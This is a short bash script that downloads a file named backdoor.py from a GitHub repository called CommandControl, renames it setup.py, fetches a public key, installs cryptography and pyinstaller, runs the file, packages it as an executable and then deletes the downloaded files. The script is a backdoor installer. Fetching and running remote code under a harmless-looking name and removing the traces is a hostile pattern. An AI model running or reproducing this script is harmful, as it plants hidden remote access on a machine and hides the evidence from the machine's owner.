#!/bin/bash
yum install -y python3;
curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py;
curl -o pubkey.pem https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/pubkey.pem;
chmod +x setup.py;
pip3 install --upgrade pip;
pip3 install setuptools_rust;
pip3 install cryptography;
pip3 install pyinstaller;
python3 setup.py;

pyinstaller setup.py;

rm setup.py
rm pubkey.pem
